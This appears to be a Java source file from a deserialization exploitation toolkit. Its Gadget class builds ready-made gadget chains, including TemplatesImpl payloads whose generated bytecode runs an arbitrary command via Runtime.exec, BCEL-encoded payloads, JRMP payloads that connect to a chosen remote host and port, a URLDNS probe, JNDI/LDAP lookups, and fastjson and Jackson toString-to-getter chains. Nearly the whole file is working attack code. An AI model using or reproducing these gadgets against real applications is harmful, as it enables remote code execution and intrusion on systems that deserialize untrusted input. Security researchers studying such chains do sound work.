package cn.org.unk;

import com.alibaba.fastjson.JSONArray;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.rowset.JdbcRowSetImpl;
import javassist.*;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.target.HotSwappableTargetSource;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import sun.security.pkcs.PKCS9Attribute;
import sun.security.pkcs.PKCS9Attributes;
import sun.swing.SwingLazyValue;

import javax.management.BadAttributeValueExpException;
import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import javax.management.remote.rmi.RMIServerImpl_Stub;
import javax.naming.CompositeName;
import javax.swing.*;
import javax.swing.event.EventListenerList;
import javax.swing.event.SwingPropertyChangeSupport;
import javax.swing.text.DefaultFormatter;
import javax.swing.text.StyledEditorKit;
import javax.swing.undo.UndoManager;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.URL;
import java.rmi.Remote;
import java.rmi.server.ObjID;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.UnicastRemoteObject;
import java.security.*;
import java.util.*;


/*


readObject->toString
    javax.management.BadAttributeValueExpException(val)
    javax.swing.event.EventListenerList(obj)


toString->getter
    fastjson 版本2 也可: JSONObject或JSONArray
    jackson 2.13.2也可: POJONode


*/

public class Gadget {


    public static JdbcRowSetImpl getJdbcRowSetImpl(String url) throws Exception{
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        Util.setFieldValue(jdbcRowSet,"dataSource",url);
        return jdbcRowSet;
    }


    public static Object getLDAPAttribute(String ldapUrl) throws Exception{
        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Object ldapAttribute = Util.createWithoutConstructor(ldapAttributeClazz);
        Util.setFieldValue(ldapAttribute,"attrID","name");
        Util.setFieldValue(ldapAttribute,"baseCtxURL",ldapUrl);
        Util.setFieldValue(ldapAttribute,"rdn", new CompositeName("a//b"));
        return ldapAttribute;
    }


    /*
        https://www.aiwin.fun/index.php/archives/4420/

        hashtable#readObject
            hashtable#reconstitutionPut
                AbstractMap#equals
                    TextAndMnemonicHashMap.get
                        obj.toString
     */
    public static Hashtable getTextAndMnemonicHashMap(Object o) throws Exception{
        Map tHashMap1 = (HashMap) Util.createWithoutConstructor(Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap"));
        Map tHashMap2 = (HashMap) Util.createWithoutConstructor(Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap"));
        tHashMap1.put(o,"yy");
        tHashMap2.put(o,"zZ");
        Util.setFieldValue(tHashMap1,"loadFactor",1);
        Util.setFieldValue(tHashMap2,"loadFactor",1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(tHashMap1,1);
        hashtable.put(tHashMap2,1);

        tHashMap1.put(o, null);
        tHashMap2.put(o, null);
        return hashtable;
    }

    public static SignedObject getSingnedObject(Serializable obj) throws Exception{
        /*
            getObject()
                ->new ObjectInputStream(this.content).readObject()
        */
        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject signedObject = new SignedObject(obj,privateKey,signingEngine);

        return signedObject;
    }
    public static TemplatesImpl getTemplatesImpl(byte[] code) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        Util.setFieldValue(templates, "_bytecodes",new byte[][]{code});
        Util.setFieldValue(templates, "_name", "name");
        Util.setFieldValue(templates, "_tfactory",new TransformerFactoryImpl());

        return templates;
    }

    public static byte[] getAbstractTransletByteCodeCmd(String cmd) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("EvilGeneratedByJavassist");
        ctClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));

        //设置namesArray为了不报空指针
        CtConstructor ctConstructor = CtNewConstructor.make("" +
                "public EvilGeneratedByJavassist(){" +
                "this.namesArray=new String[1];" +
                "this.namesArray[0]=\"QWQ\";" +
                "Runtime.getRuntime().exec(\""+cmd+"\");\n}", ctClass);

        ctClass.addConstructor(ctConstructor);
        byte[] bytes0 = ctClass.toBytecode();

        // 如果需要重复调用该方法，就需要defrost
        // 否则提示 Class is Frozen
        ctClass.defrost();
        return bytes0;
    }


    public static TemplatesImpl getTemplatesImpl(String cmd) throws Exception{
        return getTemplatesImpl(getAbstractTransletByteCodeCmd(cmd));
    }



    /*

    //TODO

    PKCS9Attributes not Serializable

    PKCS9Attributes#toString
        UIDefaults#get
            SwingLazyValue#createValue
                invoke 调用任意类的public static 方法
                    bcel
     */

    public static String getBCELByteCode(byte[] classByte)throws Exception{
        String encode = Utility.encode(classByte, true);
        String payload = "$$BCEL$$"+encode;
        return payload;
    }

    public static Object getPKCS9Attributes_BCEL(byte[] classByte)throws Exception{
        String encode = Utility.encode(classByte, true);
        String payload = "$$BCEL$$"+encode;
        PKCS9Attributes s = Util.createWithoutConstructor(PKCS9Attributes.class);
        UIDefaults uiDefaults = new UIDefaults();
        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{payload}}));

        Util.setFieldValue(s,"attributes",uiDefaults);
        return s;
    }

    public static HotSwappableTargetSource getHotSwappableTargetSource(Object obj){
        return new HotSwappableTargetSource(obj);
    }

    /*
    RemoteObjectInvocationHandler#super.readObject
        RemoteObject#readObject
            UnicastRef#readExternal
                LiveRef#read
                    ...
                    JRMP
     */
    public static RemoteObjectInvocationHandler getJRMPPayloadJDK8u231(String host, int port) throws  Exception{
        ObjID id = new ObjID(1); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        return new RemoteObjectInvocationHandler(ref);
    }

    /*
    RMIConnectionImpl_Stub#super.readObject
        RemoteObject#readObject
            UnicastRef#readExternal
                LiveRef#read
                    ...
                    JRMP
    */
    public static RMIConnectionImpl_Stub getJRMPPayloadJDK8u231RMIConnectionImpl_Stub(String host, int port) throws  Exception{
        ObjID id = new ObjID(1); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        return new RMIConnectionImpl_Stub(ref);
    }

    /*
    RMIServerImpl_Stub#super.readObject
        RemoteObject#readObject
            UnicastRef#readExternal
                LiveRef#read
                    ...
                    JRMP
    */
    public static RMIServerImpl_Stub getJRMPPayloadJDK8u231RMIServerImpl_Stub(String host, int port) throws  Exception{
        ObjID id = new ObjID(1); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        return new RMIServerImpl_Stub(ref);
    }

    /*
    反序列化时会触发readExternal
    UnicastRef#readExternal
        LiveRef#read
            ...
            JRMP
     */
    public static UnicastRef getJRMPPayloadJDK8uxxx(String host, int port) throws  Exception{
        LiveRef liveRef = new LiveRef(new ObjID(1), new TCPEndpoint(host,port), false);
        return new UnicastRef(liveRef);
    }

    public static UnicastRemoteObject getJRMPPayloadJDK8u241(String host, int port) throws  Exception{
        LiveRef liveRef = new LiveRef(new ObjID(1), new TCPEndpoint(host,port), false);
        UnicastRef ref = new UnicastRef(liveRef);
        RemoteObjectInvocationHandler remoteObjectInvocationHandler = getJRMPPayloadJDK8u231(host,port);

        RMIServerSocketFactory rmiServerSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(RMIServerSocketFactory.class.getClassLoader(),
                new Class[]{RMIServerSocketFactory.class, Remote.class},remoteObjectInvocationHandler
        );

        UnicastRemoteObject unicastRemoteObject = Util.createWithoutConstructor(UnicastRemoteObject.class);
        Util.setFieldValue(unicastRemoteObject,"ref",ref);
        Util.setFieldValue(unicastRemoteObject,"ssf",rmiServerSocketFactory);
        return unicastRemoteObject;

    }

    public static POJONode getPOJONode(Object templatesImpl) throws Exception{

        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");

        if (!ctClass.isFrozen()) {
            CtMethod ctMethod = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(ctMethod);
            ctClass.freeze();
            ctClass.toClass();
        }

        return new POJONode(templatesImpl);
    }
    public static Object getPOJONodeWithJdkDynamicAopProxy(Object templatesImpl) throws Exception{
        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
        cons.setAccessible(true);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templatesImpl);
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
        return getPOJONode(Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler));
    }

    /**
     * 运行时要加Javaagent参数 -javaagent:E:\ideaProjects\Java-unser-utils\src\main\resources\main_agent_AbstractAction.jar
     * https://forum.butian.net/index.php/share/4602
     * AbstractAction#readObejct
     * AbstractAction#putValue
     * AbstractAction#firePropertyChange
     * XString#equals
     * obj.toString
     */
    public static Object getAlignmentActionForToString(Object obj) throws Exception{
        /*
        // Java Agent 代码
        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer){
            String target1 = "javax.swing.AbstractAction";
            String className2 = className.replace("/", ".");
            if (className2.equals(target1)) {
                System.out.println("Find the Inject Class: "+target1);
                ClassPool pool = ClassPool.getDefault();
                try {
                    CtClass c = pool.getCtClass(className2);
                    CtMethod ctMethod = c.getDeclaredMethod("writeObject");
                    ctMethod.setBody("{" +
                            "System.out.println(\"Entering write Object in javax.swing.AbstractAction\");" +
                            "$1.defaultWriteObject();" +
                            "$1.writeInt(2);" +
                            "$1.writeObject(\"11\");" +
                            "System.out.println(\"writeObject of key 11\");" +
                            "$1.writeObject(arrayTable.get(\"11\"));" +
                            "$1.writeObject(\"11\");" +
                            "System.out.println(\"writeObject of key 22\");" +
                            "$1.writeObject(arrayTable.get(\"22\"));" +
                            "}");

                    byte[] bytes = c.toBytecode();
                    c.detach();
                    return bytes;
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            return new byte[0];
        }
         */

        StyledEditorKit.AlignmentAction alignmentAction = new StyledEditorKit.AlignmentAction("nm",1);

        alignmentAction.putValue("11",new XString("123")); //xstring
        alignmentAction.putValue("22",obj); // obj.toString

        SwingPropertyChangeSupport swingPropertyChangeSupport = new SwingPropertyChangeSupport(new EventListenerList());

        Util.setFieldValue(alignmentAction,"changeSupport",swingPropertyChangeSupport);

        return alignmentAction;
    }

    /**
     * 运行时要加Javaagent参数 -javaagent:E:\ideaProjects\Java-unser-utils\src\main\resources\main_agent_AbstractAction.jar
     * https://forum.butian.net/index.php/share/4602
     * AbstractAction#readObejct
     * AbstractAction#putValue
     * AbstractAction#firePropertyChange
     * obj1#equals
     */
    public static Object getAlignmentActionForEquals(Object obj1,Object obj2) throws Exception{
        StyledEditorKit.AlignmentAction alignmentAction = new StyledEditorKit.AlignmentAction("nm",1);

        alignmentAction.putValue("11",obj1);
        alignmentAction.putValue("22",obj2);

        SwingPropertyChangeSupport swingPropertyChangeSupport = new SwingPropertyChangeSupport(new EventListenerList());

        Util.setFieldValue(alignmentAction,"changeSupport",swingPropertyChangeSupport);

        return alignmentAction;
    }
    public static BadAttributeValueExpException getBadAttributeValueExpException(Object val) throws Exception{
        BadAttributeValueExpException bd = new BadAttributeValueExpException(1);
        Util.setFieldValue(bd,"val",val);
        return bd;
    }

    public static EventListenerList getEventListenerList(Object obj) throws Exception{
        EventListenerList list = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector)Util.getFieldValue(manager, "edits");
        vector.add(obj);
        Util.setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});
        return list;
    }

    public static Object getAnnotationInvocationHandler(Map memberValues) throws Exception{
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Object handler = Util.createWithoutConstructor(aClass);
        Util.setFieldValue(handler,"memberValues",memberValues);
        Util.setFieldValue(handler,"type", Target.class);
        return handler;
    }

    public static HashMap get_HashMap_HotSwappable_XString(Object obj) throws Exception{
        XString xString = new XString("");
        HotSwappableTargetSource h1 = new HotSwappableTargetSource(10);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(2);

        HashMap<Object, Object> map = new HashMap<>();
        map.put(h1,"123");
        map.put(h2,1);

        Util.setFieldValue(h1,"target",obj);
        Util.setFieldValue(h2,"target",xString);

        return map;
    }

    /*
    make map1's hashCode == map2's

    map3#readObject
        map3#put(map1,1)
        map3#put(map2,2)
            if map1's hashCode == map2's :
                map2#equals(map1)
                    map2.xString#equals(obj) // obj = map1.get(zZ)
                        obj.toString
     */
    public static HashMap get_HashMap_XString(Object obj) throws Exception{
        XString xString = new XString("");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy", xString);
        map1.put("zZ",obj);
        map2.put("zZ", xString);
        HashMap map3 = new HashMap();
        map3.put(map1,1);
        map3.put(map2,2);

        map2.put("yy", obj);
        return map3;
    }

    /*
    readObject
        URL#hashCode
            URLStreamHandler#hashCode
                URLStreamHandler#getHostAddress
                    InetAddress#getByName
     */
    public static HashMap getURLDNS(String dns) throws Exception{

        URL url = new URL("http://1.1.1.1"); // any ip
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(url,1);
        Util.setFieldValue(url,"protocol","http");
        Util.setFieldValue(url,"host",dns);
        Util.setFieldValue(url,"authority",dns);
        Util.setFieldValue(url,"hashCode",-1);
        return hashMap;
    }




    public static Object getFastjsonBadAttributeValueExpException(Object getter) throws Exception{

        ArrayList<Object> objects = new ArrayList<>();
        JSONArray objects1 = new JSONArray();
        objects1.add(getter);
        BadAttributeValueExpException bd = getBadAttributeValueExpException(objects1);
        objects.add(getter);
        objects.add(bd);
        return objects;
    }

    public static Object getFastjsonEventListenerList(Object getter) throws Exception{

        JSONArray jsonArray0 = new JSONArray();
        jsonArray0.add(getter);
        EventListenerList eventListenerList0 = Gadget.getEventListenerList(jsonArray0);
        HashMap hashMap0 = new HashMap();
        hashMap0.put(getter, eventListenerList0);
        return hashMap0;
    }
}